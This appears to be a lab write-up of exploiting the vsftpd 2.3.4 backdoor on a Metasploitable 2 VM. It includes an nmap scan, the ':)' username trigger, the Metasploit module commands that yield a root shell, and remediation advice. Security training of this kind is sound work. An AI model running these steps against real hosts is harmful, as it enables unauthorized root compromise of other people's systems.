# vsftpd 2.3.4 Backdoor — Exploitation Write-up

## Objective
Exploit a known vulnerability in a controlled, isolated lab to gain remote access to a target machine, and document the full process.

## Lab Setup
- **Attacker:** Kali Linux (VirtualBox VM)
- **Target:** Metasploitable 2 (intentionally vulnerable VM by Rapid7)
- **Network:** Host-only (isolated, no internet exposure)

## Reconnaissance
Confirmed the target was reachable, then scanned for open ports and service versions:

    nmap -sV 192.168.56.101

Key finding: port 21 running **vsftpd 2.3.4** — a version with a publicly known backdoor.

## The Vulnerability
In 2011, malicious code was inserted into the official vsftpd 2.3.4 source archive (a supply-chain attack). Logging in with a username ending in `:)` triggers a hidden function that opens a backdoor shell on port 6200, granting root access.

## Exploitation
Used the Metasploit module for this backdoor:

    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS 192.168.56.101
    set LHOST 192.168.56.102
    run

Result: a Meterpreter session opened on the target.

## Result
Confirmed root-level access:

    getuid
    # Server username: root

Full system compromise achieved.

## Remediation
- Update vsftpd to a patched version; never rely on outdated FTP daemons.
- Do not expose FTP services to untrusted networks.
- Verify software integrity (checksums/signatures) to catch tampered packages.
